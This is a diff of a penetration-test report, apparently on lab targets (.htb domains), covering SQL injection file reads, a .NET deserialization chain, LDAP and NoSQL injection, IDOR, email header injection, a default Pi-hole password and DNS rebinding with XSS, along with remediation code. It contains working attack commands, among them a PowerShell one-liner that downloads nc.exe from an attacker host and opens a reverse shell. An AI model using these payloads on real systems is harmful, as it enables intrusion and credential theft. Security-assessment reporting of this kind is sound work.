-   The pentester used SQL Server's `OPENROWSET(BULK...)` primitive to probe files on disk. Different operating-system error codes in the response distinguished between non-existent paths, existing-but-inaccessible paths, and existing readable files:
+   The tester used SQL Server's `OPENROWSET(BULK...)` primitive to probe files on disk. Different operating-system error codes in the response distinguished between non-existent paths, existing-but-inaccessible paths, and existing readable files:
 
-   * **Path does not exist returned:** 
+   * **Path does not exist returned:**
      ```Plaintext
      Cannot bulk load because the file "C:\inetpub\wwwroot\webapp\vault" could not be opened. Operating system error code 3(The system cannot find the path specified.).
      ```
-   * **Path exists but access denied returned:** 
+   * **Path exists but access denied returned:**
      ```Plaintext
      Cannot bulk load because the file "C:\inetpub\wwwroot" could not be opened. Operating system error code 5(Access is denied.).
      ```
-   * **File does not exist returned:** 
+   * **File does not exist returned:**
      ```Plaintext
      Cannot bulk load. The file "C:\inetpub\wwwroot\vault.royalflush.htb\Web.configs" does not exist or you don't have file access rights.
      ```
 
 5. **Locating and dumping Web.config**
 
-   After testing several paths, the pentester confirmed that `C:\inetpub\wwwroot\vault.royalflush.htb\Web.config` existed because the request returned `302 Found` instead of a file-not-found error. Supplying a deliberately wrong filename such as `Web.configs` returned `500` with a clear "does not exist" message, confirming the base file was real.
+   After testing several paths, the tester confirmed that `C:\inetpub\wwwroot\vault.royalflush.htb\Web.config` existed because the request returned `302 Found` instead of a file-not-found error. Supplying a deliberately wrong filename such as `Web.configs` returned `500` with a clear "does not exist" message, confirming the base file was real.
 
-   The pentester then wrote a script to read the file in chunks through the SQL injection and reassemble its contents.
-   
+   The tester then wrote a script to read the file in chunks through the SQL injection and reassemble its contents.
+
 [vault.royalflush.htb-SecondaryEmail-SQLI-Web-Config-dump.py](exploits/vault.royalflush.htb-SecondaryEmail-SQLI-Web-Config-dump.py)
 
    The dumped `Web.config` contained the application's sensitive cryptographic keys:
 
-   
+
 
    ```XML
    <add key="webpages:Version" value="3.0.0.0" />
@@ -1924,102 +1902,104 @@ The SQL injection in `/My/SecondaryEmail` runs in the context of Microsoft SQL S
    </appSettings>
    ```
 
- ![](assets/edited-3z19onm8.png){width="auto"}
-   
-   
+ 
+
+![3z19onm8](assets/edited-3z19onm8.png)
+
+
    With these keys, an attacker can forge authentication cookies and decrypt stored password values, completing the compromise of the vault application.
 
 
 #### Patching and Remediation
 
-1. Use parameterized queries                                                                                                                                                              
-      Replace the dynamic SQL in MyController.SecondaryEmail() with a parameterized query. Never concatenate user input into CommandText:                                                    
-                                                                                                                                                                                             
-      ```csharp                                                                                                                                                                              
-        [HttpPost]                                                                                                                                                                           
-        public ActionResult SecondaryEmail()                                                                                                                                                 
-        {                                                                                                                                                                                    
-            User user = AuthService.LoggedInUser(Request);                                                                                                                                   
-            if (user == null) return Redirect("/Auth/Login");                                                                                                                                
-                                                                                                                                                                                             
-            string secondaryEmail = Request["secondaryEmail"];                                                                                                                               
-                                                                                                                                                                                             
-            if (!secondaryEmail.IsEmpty())                                                                                                                                                   
-            {                                                                                                                                                                                
-                // Use System.Net.Mail.MailAddress for proper email validation                                                                                                               
-                try                                                                                                                                                                          
-                {                                                                                                                                                                            
-                    var addr = new System.Net.Mail.MailAddress(secondaryEmail);                                                                                                              
-                }                                                                                                                                                                            
-                catch                                                                                                                                                                        
-                {                                                                                                                                                                            
-                    return Redirect("/My/Settings");                                                                                                                                         
-                }                                                                                                                                                                            
-                                                                                                                                                                                             
-                using (SqlConnection conn = DbService.GetSqlConnection())                                                                                                                    
-                using (SqlCommand cmd = new SqlCommand())                                                                                                                                    
-                {                                                                                                                                                                            
-                    cmd.Connection = conn;                                                                                                                                                   
-                    cmd.CommandType = CommandType.Text;                                                                                                                                      
-                    cmd.CommandText = "SELECT 1 FROM Users WHERE Email = @Email OR SecondaryEmail = @SecondaryEmail";                                                                        
-                    cmd.Parameters.AddWithValue("@Email", secondaryEmail);                                                                                                                   
-                    cmd.Parameters.AddWithValue("@SecondaryEmail", secondaryEmail);                                                                                                          
-                                                                                                                                                                                             
-                    conn.Open();                                                                                                                                                             
-                    using (SqlDataReader rdr = cmd.ExecuteReader())                                                                                                                          
-                    {                                                                                                                                                                        
-                        if (!rdr.Read())                                                                                                                                                     
-                        {                                                                                                                                                                    
-                            rdr.Close();                                                                                                                                                     
-                            cmd.CommandText = "UPDATE Users SET SecondaryEmail = @SecondaryEmail WHERE UserID = @UserID";                                                                    
-                            cmd.Parameters.Clear();                                                                                                                                          
-                            cmd.Parameters.AddWithValue("@SecondaryEmail", secondaryEmail);                                                                                                  
-                            cmd.Parameters.AddWithValue("@UserID", user.UserID);                                                                                                             
-                            cmd.ExecuteNonQuery();                                                                                                                                           
-                        }                                                                                                                                                                    
-                    }                                                                                                                                                                        
-                }                                                                                                                                                                            
-            }                                                                                                                                                                                
-            return Redirect("/My/Settings");                                                                                                                                                 
-        }                                                                                                                                                                                    
-      ```                                                                                                                                                                                    
-                                                                                                                                                                                             
-   2. Validate email format correctly                                                                                                                                                        
-      Replace the bypassable regex with System.Net.Mail.MailAddress or a strictly anchored RFC-compliant regex. Also normalize and trim the input before validation and storage.             
-                                                                                                                                                                                             
-   3. Apply least privilege to the database account                                                                                                                                          
-      The vault_user account should only have the minimum permissions required: SELECT, INSERT, UPDATE, and DELETE on the specific tables it needs. It should not have permissions to run    
-      OPENROWSET(BULK...), xp_cmdshell, xp_dirtree, or other server-level features that enable file-system access.                                                                           
-                                                                                                                                                                                             
-   4. Disable dangerous SQL Server features if not needed                                                                                                                                    
+1. Use parameterized queries
+      Replace the dynamic SQL in MyController.SecondaryEmail() with a parameterized query. Never concatenate user input into CommandText:
+
+      ```csharp
+        [HttpPost]
+        public ActionResult SecondaryEmail()
+        {
+            User user = AuthService.LoggedInUser(Request);
+            if (user == null) return Redirect("/Auth/Login");
+
+            string secondaryEmail = Request["secondaryEmail"];
+
+            if (!secondaryEmail.IsEmpty())
+            {
+                // Use System.Net.Mail.MailAddress for proper email validation
+                try
+                {
+                    var addr = new System.Net.Mail.MailAddress(secondaryEmail);
+                }
+                catch
+                {
+                    return Redirect("/My/Settings");
+                }
+
+                using (SqlConnection conn = DbService.GetSqlConnection())
+                using (SqlCommand cmd = new SqlCommand())
+                {
+                    cmd.Connection = conn;
+                    cmd.CommandType = CommandType.Text;
+                    cmd.CommandText = "SELECT 1 FROM Users WHERE Email = @Email OR SecondaryEmail = @SecondaryEmail";
+                    cmd.Parameters.AddWithValue("@Email", secondaryEmail);
+                    cmd.Parameters.AddWithValue("@SecondaryEmail", secondaryEmail);
+
+                    conn.Open();
+                    using (SqlDataReader rdr = cmd.ExecuteReader())
+                    {
+                        if (!rdr.Read())
+                        {
+                            rdr.Close();
+                            cmd.CommandText = "UPDATE Users SET SecondaryEmail = @SecondaryEmail WHERE UserID = @UserID";
+                            cmd.Parameters.Clear();
+                            cmd.Parameters.AddWithValue("@SecondaryEmail", secondaryEmail);
+                            cmd.Parameters.AddWithValue("@UserID", user.UserID);
+                            cmd.ExecuteNonQuery();
+                        }
+                    }
+                }
+            }
+            return Redirect("/My/Settings");
+        }
+      ```
+
+   2. Validate email format correctly
+      Replace the bypassable regex with System.Net.Mail.MailAddress or a strictly anchored RFC-compliant regex. Also normalize and trim the input before validation and storage.
+
+   3. Apply least privilege to the database account
+      The vault_user account should only have the minimum permissions required: SELECT, INSERT, UPDATE, and DELETE on the specific tables it needs. It should not have permissions to run
+      OPENROWSET(BULK...), xp_cmdshell, xp_dirtree, or other server-level features that enable file-system access.
+
+   4. Disable dangerous SQL Server features if not needed
       Turn off xp_cmdshell and Ole Automation Procedures, and restrict OPENROWSET/BULK INSERT to accounts that genuinely require them. Enable TRUSTWORTHY and IMPERSONATE only where strictly
-      necessary.                                                                                                                                                                             
-                                                                                                                                                                                             
-   5. Do not expose detailed error messages                                                                                                                                                  
-      Configure ASP.NET custom errors in Web.config so that stack traces, file paths, and database error details are never returned to the browser in production:                            
-                                                                                                                                                                                             
-      ```xml                                                                                                                                                                                 
-        <system.web>                                                                                                                                                                         
-            <customErrors mode="On" defaultRedirect="~/Error/Generic">                                                                                                                       
-                <error statusCode="500" redirect="~/Error/ServerError"/>                                                                                                                     
-            </customErrors>                                                                                                                                                                  
-        </system.web>                                                                                                                                                                        
-      ```                                                                                                                                                                                    
-                                                                                                                                                                                             
-   6. Rotate all exposed secrets immediately                                                                                                                                                 
-      Because the attacker extracted AuthKey, PasswordKey, and PasswordIV from Web.config, these must be regenerated and replaced. All existing sessions should be invalidated, and all      
-      stored encrypted passwords should be re-encrypted with the new keys or reset.                                                                                                          
-                                                                                                                                                                                             
-   7. Move secrets out of source-controlled configuration                                                                                                                                    
-      Store cryptographic keys in environment variables, Azure Key Vault, AWS Secrets Manager, or another secrets manager rather than in Web.config. Ensure the application process identity 
-      is the only account that can read them.                                                                                                                                                
-                                                                                                                                                                                             
-   8. Audit all SQL queries                                                                                                                                                                  
-      Search the entire codebase for string.Format, + concatenation, or inline string interpolation inside CommandText. Every query must use SqlParameter. Pay special attention to          
-      MyController, AuthService, and any other controllers.                                                                                                                                  
-                                                                                                                                                                                             
-   9. Implement Web Application Firewall (WAF) rules                                                                                                                                         
-      As a defense-in-depth measure, add WAF rules to detect SQL keywords, UNION SELECT, and bulk-load primitives in input fields. This should not replace parameterized queries but can block automated scanners and obvious injection attempts. 
+      necessary.
+
+   5. Do not expose detailed error messages
+      Configure ASP.NET custom errors in Web.config so that stack traces, file paths, and database error details are never returned to the browser in production:
+
+      ```xml
+        <system.web>
+            <customErrors mode="On" defaultRedirect="~/Error/Generic">
+                <error statusCode="500" redirect="~/Error/ServerError"/>
+            </customErrors>
+        </system.web>
+      ```
+
+   6. Rotate all exposed secrets immediately
+      Because the attacker extracted AuthKey, PasswordKey, and PasswordIV from Web.config, these must be regenerated and replaced. All existing sessions should be invalidated, and all
+      stored encrypted passwords should be re-encrypted with the new keys or reset.
+
+   7. Move secrets out of source-controlled configuration
+      Store cryptographic keys in environment variables, Azure Key Vault, AWS Secrets Manager, or another secrets manager rather than in Web.config. Ensure the application process identity
+      is the only account that can read them.
+
+   8. Audit all SQL queries
+      Search the entire codebase for string.Format, + concatenation, or inline string interpolation inside CommandText. Every query must use SqlParameter. Pay special attention to
+      MyController, AuthService, and any other controllers.
+
+   9. Implement Web Application Firewall (WAF) rules
+      As a defense-in-depth measure, add WAF rules to detect SQL keywords, UNION SELECT, and bulk-load primitives in input fields. This should not replace parameterized queries but can block automated scanners and obvious injection attempts.
 
 
 ### .NET BinaryFormatter deserialization {#0038712a-c54f-41b6-bad2-da0c98d68114}
@@ -2098,9 +2078,9 @@ The root cause is the use of an insecure deserializer on untrusted input:
 
 1. **Prepare the PowerShell download and shell payload**
 
-   The pentester created a base64-encoded PowerShell command that downloads `nc.exe` from the attacker's server and executes a reverse shell:
+   The tester created a base64-encoded PowerShell command that downloads `nc.exe` from the attacker's server and executes a reverse shell:
 
-   
+
 
    ```bash
    echo -n '(new-object net.webclient).downloadfile("http://<ip>:<port>/nc.exe", "c:\windows\tasks\nc.exe");c:\windows\tasks\nc.exe -nv <ip> <shell-port> -e c:\windows\system32\cmd.exe;' | iconv -t UTF-16LE | base64 -w0
@@ -2110,9 +2090,9 @@ The root cause is the use of an insecure deserializer on untrusted input:
 
 2. **Generate the .NET deserialization gadget**
 
-   Using `ysoserial.net`, the pentester generated a malicious `BinaryFormatter` payload with the `TypeConfuseDelegate` gadget chain, passing the encoded PowerShell command as the execution argument:
+   Using `ysoserial.net`, the tester generated a malicious `BinaryFormatter` payload with the `TypeConfuseDelegate` gadget chain, passing the encoded PowerShell command as the execution argument:
 
-   
+
 
    ```powershell
    .\ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "powershell -nop -enc <payload_b64>"
@@ -2130,9 +2110,9 @@ The root cause is the use of an insecure deserializer on untrusted input:
    <add key="PasswordIV" value="5ac8083e-8ff6-43" />
    ```
 
-   The pentester used the helper script `vault.royalflush.htb-Deserialization-Payload.py` to perform this encryption. First, the base64-encoded gadget payload was saved to `payload.b64`, then:
+   The tester used the helper script `vault.royalflush.htb-Deserialization-Payload.py` to perform this encryption. First, the base64-encoded gadget payload was saved to `payload.b64`, then:
 
-   
+
 
    ```bash
    python vault.royalflush.htb-Deserialization-Payload.py payload.b64
@@ -2142,9 +2122,9 @@ The root cause is the use of an insecure deserializer on untrusted input:
 
 4. **Start the listener**
 
-   On the attacker machine, the pentester started a netcat listener to catch the reverse shell:
+   On the attacker system, the tester started a netcat listener to catch the reverse shell:
 
-   
+
 
    ```bash
    nc -lvnp <shell-port>
@@ -2152,25 +2132,23 @@ The root cause is the use of an insecure deserializer on untrusted input:
 
    A simple HTTP server was also started to serve `nc.exe`:
 
-   Bash
-
-   ```
+   ```bash
    python3 -m http.server <port>
    ```
 
 5. **Submit the encrypted payload**
 
-   The pentester logged in to the vault application and submitted the encrypted payload through the Import Password feature at `POST /My/ImportPassword`, supplying a name and the generated ciphertext as the `encryptedPassword` value.
+   The tester logged in to the vault application and submitted the encrypted payload through the Import Password feature at `POST /My/ImportPassword`, supplying a name and the generated ciphertext as the `encryptedPassword` value.
 
 6. **Trigger deserialization and gain RCE**
 
-   The pentester navigated to `/My/Passwords`. The application retrieved the newly imported entry, decrypted the ciphertext with AES, and passed the resulting bytes to `BinaryFormatter.Deserialize()`. The gadget chain executed, launching PowerShell, downloading `nc.exe`, and connecting back to the attacker listener.
+   The tester navigated to `/My/Passwords`. The application retrieved the newly imported entry, decrypted the ciphertext with AES, and passed the resulting bytes to `BinaryFormatter.Deserialize()`. The gadget chain executed, launching PowerShell, downloading `nc.exe`, and connecting back to the attacker listener.
 
 7. **Shell access and flag retrieval**
 
-   The reverse shell connected, giving the pentester command execution as the IIS application pool identity on the target server. The flag was found in the root of `C:\`:
+   The reverse shell connected, giving the tester command execution as the IIS application pool identity on the target server. The flag was found in the root of `C:\`:
 
-   
+
 
    ```dos
    C:\> dir C:\
@@ -2179,10 +2157,10 @@ The root cause is the use of an insecure deserializer on untrusted input:
    ```
 
 
-![](assets/edited-teGQvpT4.png){width="auto"}
+![teGQvpT4](assets/edited-teGQvpT4.png)
 
 
-   The pentester had successfully achieved remote code execution by chaining the SQL injection/file-read vulnerability with the insecure `BinaryFormatter` deserialization.
+   The tester had successfully achieved remote code execution by chaining the SQL injection/file-read vulnerability with the insecure `BinaryFormatter` deserialization.
 
 
 #### Patching and Remediation
@@ -2235,7 +2213,7 @@ The root cause is the use of an insecure deserializer on untrusted input:
 
    Encryption alone does not protect integrity. Use an HMAC (e.g., `HMACSHA256` with a separate key) over the ciphertext and verify it before decryption. This prevents an attacker from forging ciphertext even if the encryption key is compromised.
 
-   
+
 
    ```c#
    byte[] ComputeHmac(byte[] data)
@@ -2265,7 +2243,7 @@ The root cause is the use of an insecure deserializer on untrusted input:
 
    If migration away from BinaryFormatter is not immediately possible, set an AppContext switch to block dangerous types and configure a strict `SerializationBinder` that whitelists only `byte[]`:
 
-   
+
 
    ```c#
    AppContext.SetSwitch("Switch.System.Runtime.Serialization.Formatters.Binary.BinaryFormatter.DangerousBinaryFormatterSerializationSwitch", true);
@@ -2349,10 +2327,10 @@ The \* character is the LDAP wildcard, so the filter evaluates to true for any e
 
 #### Detailed Walkthrough
 
-1. Visited ldap.vitamedix.htb/login.
+1. A request to ldap.vitamedix.htb/login returned the login page.
 2. Entered *:* in both username and password fields.
 3. Server built an LDAP filter like (&(uid=*:*)(userPassword=*:*)), which matched any directory entry.
-![](assets/Screenshot-from-2026-08-13-19-18-06-zJ8HQ8jy.png){width="auto"}
+![13 19 18 06 zJ8HQ8jy](assets/Screenshot-from-2026-08-13-19-18-06-zJ8HQ8jy.png)
 4. Logged in as the first returned account — admin.
 5. Enumerated users and found <mic****@vitamedix.htb>.
 
@@ -2422,19 +2400,19 @@ This allows an attacker to determine which email addresses are registered by bru
 
 #### Security Impact
 
-  • Enumerates valid user accounts for targeted phishing or credential-stuffing attacks.                                                                                                    
-  
+  • Enumerates valid user accounts for targeted phishing or credential-stuffing attacks.
+
 
 #### Detailed Walkthrough
 
-1. Go to self-service.vitamedix.htb/forgot-password.
+1. A request to self-service.vitamedix.htb/forgot-password returned the password-reset form.
 2. Submit an invalid email, e.g. <notauser@vitamedix.htb>.
 3. Server responds: Not found.
 4. Submit a valid email, e.g. <mic****@vitamedix.htb>.
 5. Server responds: Email sent.
 6. The response difference confirms <mic****@vitamedix.htb> is a registered account.
-7. 
-![](assets/edited-qJdFDohk.png){width="auto"} 
+7.
+![qJdFDohk](assets/edited-qJdFDohk.png)
 
 8. Repeat with a wordlist to enumerate all valid users.
 
@@ -2460,8 +2438,8 @@ CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N (7.1 - High)
 #### Affected Component(s)
 
 * Storage-master/storage/storage.vitamedix.htb/src/render.php
-* Storage-master/storage/storage.vitamedix.htb/src/reports.php 
-* Storage-master/storage/storage.vitamedix.htb/src/db.php (fetch_data())   
+* Storage-master/storage/storage.vitamedix.htb/src/reports.php
+* Storage-master/storage/storage.vitamedix.htb/src/db.php (fetch_data())
 
 #### External References
 
@@ -2471,16 +2449,16 @@ CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N (7.1 - High)
 
 #### Description & Cause
 
-Description                                                                                                                                                                               
-                                                                                                                                                                                             
-   An authenticated user can read files belonging to other accounts by manipulating the file ID flow between reports.php and render.php. Although reports.php rejects unauthorized IDs, it   
-   stores the requested ID in the session before the access check. Visiting render.php afterwards serves the file because render.php never validates ownership.                              
-                                                                                                                                                                                             
-   Causes                                                                                                                                                                                    
-                                                                                                                                                                                             
-   1. Authorization only in one location — render.php has no ownership check.                                                                                                                
-   2. Session write before validation — reports.php saves the user-supplied ID into $_SESSION before confirming access.                                                                      
-   3. Trusting session state — render.php assumes the session ID was pre-authorized.                                                                                                         
+Description
+
+   An authenticated user can read files belonging to other accounts by manipulating the file ID flow between reports.php and render.php. Although reports.php rejects unauthorized IDs, it
+   stores the requested ID in the session before the access check. Visiting render.php afterwards serves the file because render.php never validates ownership.
+
+   Causes
+
+   1. Authorization only in one location — render.php has no ownership check.
+   2. Session write before validation — reports.php saves the user-supplied ID into $_SESSION before confirming access.
+   3. Trusting session state — render.php assumes the session ID was pre-authorized.
    4. Missing defense-in-depth — no second authorization check on the actual data-fetch operation.
 
 #### Security Impact
@@ -2492,7 +2470,7 @@ Description
 #### Detailed Walkthrough
 
 1. Source code review of `Storage-master/storage/storage.vitamedix.htb/src/config.php` reveals hardcoded database credentials: `henry:H3nry_V@u*******`.
-2. Log in to `storage.vitamedix.htb` and request a file you own: `GET /reports.php?id=1`.
+2. After authenticating to `storage.vitamedix.htb`, a request for a file owned by the user returned the file: `GET /reports.php?id=1`.
 3. Intercept the response — server sets `$_SESSION['id'] = 1`, passes the access check, and redirects to `render.php`.
 4. Request a file you do not own: `GET /reports.php?id=133`.
 5. Server sets `$_SESSION['id'] = 133`, fails `check_access()`, and redirects to `error.php`.
@@ -2501,20 +2479,20 @@ Description
 8. The response now leaks the unauthorized file, e.g., SMTP credentials.
 
 
-script to automate it 
+script to automate it
 
 [storage.vitamedix.htb-SMTP-Creds-LEAK.py](exploits/storage.vitamedix.htb-SMTP-Creds-LEAK.py)
 
-![](assets/edited-N2aP1zpX.png){width="auto"}
+![N2aP1zpX](assets/edited-N2aP1zpX.png)
 
 
 
 #### Patching and Remediation
 
-  1. Re-authorize in render.php — call check_access($_SESSION['id'], $_SESSION['user']) before fetching the file.                                                                           
-   2. Set session ID only after authorization — in reports.php, validate ownership before storing the ID in $_SESSION.                                                                       
-   3. Pass ID via signed/encrypted parameter — use a token instead of a raw integer in the URL/session.                                                                                      
-   4. Remove hardcoded credentials — move henry:H3nry_V@ulT_d3v! from config.php to environment variables or a secrets manager and rotate it.                                                
+  1. Re-authorize in render.php — call check_access($_SESSION['id'], $_SESSION['user']) before fetching the file.
+   2. Set session ID only after authorization — in reports.php, validate ownership before storing the ID in $_SESSION.
+   3. Pass ID via signed/encrypted parameter — use a token instead of a raw integer in the URL/session.
+   4. Remove hardcoded credentials — move `he***:H3nry_***** `from config.php to environment variables or a secrets manager and rotate it.
    5. Log access attempts — alert on unauthorized file access attempts.
 
   **Fixed Code**
@@ -2649,11 +2627,11 @@ email=michael%40vitamedix.htb%0d%0aCc:+smtp-dev@vitamedix.htb%0d%0aDAM:+
 #### Detailed Walkthrough
 
 
-1. Navigate to `selfservice.vitamedix.htb/reset.php`.
+1. A request to `selfservice.vitamedix.htb/reset.php` returned the reset page.
 
 2. Submit the payload in the `email` field:
 
-   
+
 
    ```http
    michael%40vitamedix.htb%0d%0aCc:+smtp-dev@vitamedix.htb%0d%0aDAM:+
@@ -2663,20 +2641,20 @@ email=michael%40vitamedix.htb%0d%0aCc:+smtp-dev@vitamedix.htb%0d%0aDAM:+
 
 4. The email is generated and sent to `michael@vitamedix.htb`, with a copy delivered to the attacker's address.
 
-![](assets/edited-noHcjyeb.png){width="auto"}
+![noHcjyeb](assets/edited-noHcjyeb.png)
 5. In the attacker's inbox (`smtp-dev@vitamedix.htb`), the email is received containing the newly generated credentials:
 
-   
+
 
    ```Plaintext
    Subject: Password reset for mic****
    Your new password is 9ecf1ffe7c795099b8ad40**********
    ```
 
-6. Log in to the `newsletter.vitamedix.htb` as `mic****@vitamedix.htb` using the intercepted password.
+6. Authenticated access to `newsletter.vitamedix.htb` was obtained as `mic****@vitamedix.htb` using the intercepted password.
 7. Notice the flag at the `http://newsletter.vitamedix.htb/home`
 
-![](assets/Screenshot-from-2026-08-13-23-13-51.png){width="auto"}
+![13 23 13 51](assets/Screenshot-from-2026-08-13-23-13-51.png)
 
 
 #### Patching and Remediation
@@ -2689,7 +2667,7 @@ email=michael%40vitamedix.htb%0d%0aCc:+smtp-dev@vitamedix.htb%0d%0aDAM:+
 
 
 
-### DNS.vitamedix:8006 Pi-hole password leak (WEBPASSWORD: pihole) {#0f92f352-828c-4b46-b853-6592beec8b3d}
+### DNS.vitamedix:8006 Pi-hole password leak (WEBPASSWORD: pih***) {#0f92f352-828c-4b46-b853-6592beec8b3d}
 
 #### CWE
 
@@ -2711,16 +2689,14 @@ CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (9.3 - Critical)
 
 #### Description & Cause
 
-The DNS server component is deployed as a Pi-hole container via DNS-Server-master/dns-server/docker-compose.yml. The Pi-hole web admin password is explicitly set to the default/weak value pihole through the WEBPASSWORD environment variable:
+The DNS server component is deployed as a Pi-hole container via DNS-Server-master/dns-server/docker-compose.yml. The Pi-hole web admin password is explicitly set to the default/weak value pih*** through the WEBPASSWORD environment variable:
 
-YAML
-
-```
+```yaml
      environment:
        WEBPASSWORD: "pih***"
 ```
 
-This value is a well-known default password for Pi-hole. The web administration interface is exposed on port 8006, and no additional authentication hardening is applied. An unauthenticated remote attacker can log in to the Pi-hole admin panel using the username admin and password pihole, gaining full administrative control over the DNS service.
+This value is a well-known default password for Pi-hole. The web administration interface is exposed on port 8006, and no additional authentication hardening is applied. An unauthenticated remote attacker can log in to the Pi-hole admin panel using the  password pih***, gaining full administrative control over the DNS service.
 
 
 #### Security Impact
@@ -2734,17 +2710,17 @@ Once authenticated to Pi-hole, the attacker can:
 
 #### Detailed Walkthrough
 
-1. Browse to <http://dns.vitamedix.htb:8006/admin/login.php>.
+1. A request to <http://dns.vitamedix.htb:8006/admin/login.php> returned the login page.
 
-![](assets/image.png){width="auto"}
+![image](assets/image.png)
 
 2. Enter the default Pi-hole password: pih***.
 3. Submit the form — the application logs you into the admin dashboard at /admin/.
-4. 
-![](assets/edited-JBVrLWta.png){width="auto"}
+4.
+![JBVrLWta](assets/edited-JBVrLWta.png)
 
 5. From the dashboard, you can view DNS query logs, modify blocklists/whitelists, and control DNS resolution.
-![](assets/edited-GnyLQ1C1.png){width="auto"}
+![GnyLQ1C1](assets/edited-GnyLQ1C1.png)
 
 
 #### Patching and Remediation
@@ -2861,7 +2837,7 @@ If the first character is 0, the response is:
 {"message":"true"}
 ```
 
-![](assets/Screenshot-from-2026-08-14-10-37-48.png){width="auto"}
+![14 10 37 48](assets/Screenshot-from-2026-08-14-10-37-48.png)
 
 
 
@@ -2875,7 +2851,7 @@ HTTP/1.1 401 Unauthorized
 ```
 
 
-![](assets/Screenshot-from-2026-08-14-10-37-56.png){width="auto"}
+![14 10 37 56](assets/Screenshot-from-2026-08-14-10-37-56.png)
 
 This confirms that:
 
@@ -2908,7 +2884,7 @@ After 32 successful position checks, the recovered token is, for example:
 
 #### Step 4 — Register a user with the recovered token
 
-Submit the recovered token to `/api/register`:
+Submitting the recovered token to `/api/register` produced the following request:
 
 
 
@@ -2932,7 +2908,7 @@ Content-Type: application/json
 
 #### Step 5 — Verify token reuse
 
-Submit the same token again with a different username:
+Submitting the same token again with a different username produced the following response:
 
 
 
@@ -2952,11 +2928,11 @@ Response:
 {"message":"User registered!"}
 ```
 
-![](assets/edited-KniFiyTx.png){width="auto"}
+![KniFiyTx](assets/edited-KniFiyTx.png)
 
 
 
-script to dump token 
+script to dump token
 
 [www.vitamedix.htb-validate-token-NOSQLI.py](exploits/www.vitamedix.htb-validate-token-NOSQLI.py)
 
@@ -3036,7 +3012,7 @@ async validateToken(token) {
 
    Add Joi validation to `/api/validateToken` so malformed requests are rejected before reaching the database helper:
 
-   
+
 
    ```javascript
    // In helpers/ValidationSchema.js
@@ -3083,7 +3059,7 @@ CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:A/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N (8.7 - High)
 
 The application accepts external URLs through POST /api/documentSubmit and passes them to an internal headless browser (bot.checkMessage). The URL whitelist in src/helpers/URLHelper.js resolves the hostname once and only blocks exact loopback addresses (127.0.0.1, ::1, etc.); it does not pin the resolved IP for the actual HTTP request. This allows a DNS-rebinding attack.
 
-Because the DNS server (Pi-hole) is reachable with the default password pihole, an attacker can first hijack DNS resolution for [www.vitamedix.htb](http://www.vitamedix.htb) and force it to alternate between a public IP and an attacker-controlled IP. A submitted document URL such as <http://www.vitamedix.htb:4444/redirect.php> therefore passes the application’s URL check while the browser bot ultimately fetches content from the attacker.
+Because the DNS server (Pi-hole) is reachable with the default password pih***, an attacker can first hijack DNS resolution for [www.vitamedix.htb](http://www.vitamedix.htb) and force it to alternate between a public IP and an attacker-controlled IP. A submitted document URL such as <http://www.vitamedix.htb:4444/redirect.php> therefore passes the application’s URL check while the browser bot ultimately fetches content from the attacker.
 
 The attacker’s redirect.php performs a cross-origin POST to /api/settings in the bot’s authenticated session. The settings endpoint has no CSRF protection (bodyParser.json({ type: () => true }) accepts any content type, and the session cookie lacks SameSite), so the request succeeds and updates full\_name to a JavaScript payload. The bot is then redirected to /settings, where {{ user.full\_name | safe }} renders the value without escaping and the stored XSS executes. The payload exfiltrates the bot’s session cookie to the attacker’s listener.
 
@@ -3093,7 +3069,7 @@ The attacker’s redirect.php performs a cross-origin POST to /api/settings in t
 * src/routes/index.js:80-88 — /api/documentSubmit forwards user URLs to bot.checkMessage.
 * src/routes/index.js:116-126 — POST /api/settings has no CSRF protection.
 * src/views/settings.html:26 and dashboard.html:29 — render user.full\_name with | safe.
-* DNS-Server-master/dns-server/docker-compose.yml — Pi-hole admin password hardcoded to pihole.
+* DNS-Server-master/dns-server/docker-compose.yml — Pi-hole admin password hardcoded to pih***.
 
 
 #### Security Impact
@@ -3110,16 +3086,16 @@ The final impact is full compromise of the bot’s session. Because the bot runs
 #### Prerequisites
 
 * Attacker machine IP: <Attacker_IP>
-* Pi-hole admin access already obtained via password `pihole`
+* Pi-hole admin access already obtained via password `pih***`
 * A valid user session on [www.vitamedix.htb](http://www.vitamedix.htb) to submit a document URL
 
 #### Step 1 — Hijack DNS resolution in Pi-hole
 
-1. Log in to Pi-hole at `[http://dns.vitamedix.htb:8006/admin/login.php](http://dns.vitamedix.htb:8006/admin/login.php)` with password `pihole`.
+1. Authenticated access to Pi-hole at `[http://dns.vitamedix.htb:8006/admin/login.php](http://dns.vitamedix.htb:8006/admin/login.php)` was obtained with password `pih***`.
 
-2. Navigate to Settings → DNS:
+2. The Settings → DNS page was opened.
 
-   
+
 
    ```
    http://dns.vitamedix.htb:8006/admin/settings.php?tab=dns
@@ -3127,7 +3103,7 @@ The final impact is full compromise of the bot’s session. Because the bot runs
 
 3. Under Upstream DNS Servers → Custom 1 (IPv4), enter the attacker IP:
 
-   
+
 
    ```
    <Attacker_IP>
@@ -3141,7 +3117,7 @@ From this point, all DNS queries routed through Pi-hole will be answered by the 
 
 #### Step 2 — Start the DNS rebinder
 
-On the attacker machine, run:
+On the attacker system, run:
 
 
 
@@ -3186,13 +3162,13 @@ python3 -m http.server 4445
 
 #### Step 4 — Submit the malicious document URL
 
-1. Log in to `[http://www.vitamedix.htb](http://www.vitamedix.htb)`.
+1. Authenticated access to `[http://www.vitamedix.htb](http://www.vitamedix.htb)` was obtained.
 
-2. Go to the dashboard and open the Submit documents dialog.
+2. Opening the dashboard and the Submit documents dialog loaded the document submission interface.
 
 3. Enter the URL:
 
-   
+
 
    ```
    http://www.vitamedix.htb:4444/redirect.php
@@ -3208,7 +3184,7 @@ The bot loads `redirect.php`, which executes JavaScript in the bot’s authentic
 
 1. The script sends a POST request to `[http://www.vitamedix.htb/api/settings](http://www.vitamedix.htb/api/settings)` with the body:
 
-   
+
 
    ```JSON
    {
@@ -3221,7 +3197,7 @@ The bot loads `redirect.php`, which executes JavaScript in the bot’s authentic
 
 2. After the update, the script redirects the bot to:
 
-   
+
 
    ```
    http://www.vitamedix.htb/settings
